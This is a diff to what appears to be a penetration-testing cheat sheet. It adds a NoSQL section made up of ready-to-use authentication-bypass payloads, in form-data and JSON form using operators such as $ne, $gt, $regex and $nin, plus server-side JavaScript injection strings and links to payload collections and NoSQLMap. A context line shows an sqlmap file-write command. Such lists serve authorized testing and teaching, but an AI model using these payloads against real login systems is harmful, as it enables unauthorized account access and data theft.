@@ -88,12 +88,32 @@ sqlmap -u <url> --data <data> --file-write <local_file> --file-dest <destination
 
 
 
-## Tools (NoSQL)
-### List of tools and exploits
+## NoSQL
 [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
 
-​
+### Authentication Bypass
+```
+DATA
+username[$ne]=toto&password[$ne]=toto
+login[$regex]=a.*&pass[$ne]=lol
+login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+
+JSON
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+```
+
+### SSJI
+```
+';return 'a'=='a' && ''=='
+";return 'a'=='a' && ''=='
+0;return true
+```
+
 ### NoSQLMap
-Since the tool is using a menu based system, I'll link the GitHub page for one to read the steps.     
+Since the tool is using a menu based system, I'll just link the GitHub.     
 [Documentation and Release](https://github.com/codingo/NoSQLMap)
 ​​
